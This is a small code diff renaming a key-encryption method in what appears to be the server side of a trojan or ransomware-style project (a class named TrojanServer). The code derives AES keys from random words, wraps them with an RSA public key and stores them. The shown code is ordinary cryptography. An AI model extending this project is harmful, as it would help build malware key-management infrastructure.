@@ -40,7 +40,7 @@ class KeyManager:
         hasher.update(word.encode())
         return hasher.digest()
 
-    def encrypt_aes_key(self, aes_key, public_key_path="server_RSA_public.pem"):
+    def encrypt_aes_key_with_rsa(self, aes_key, public_key_path="server_RSA_public.pem"):
         with open(public_key_path, "rb") as f:
             pub = RSA.import_key(f.read())
         cipher = PKCS1_OAEP.new(pub)
@@ -107,7 +107,7 @@ class TrojanServer:
     def generate_and_store_key(self):
         word = self.keys.get_random_word()
         aes_key = self.keys.derive_key_from_word(word)
-        encrypted = self.keys.encrypt_aes_key(aes_key)
+        encrypted = self.keys.encrypt_aes_key_with_rsa(aes_key)
         self.db.save_key(encrypted)
         return aes_key
 
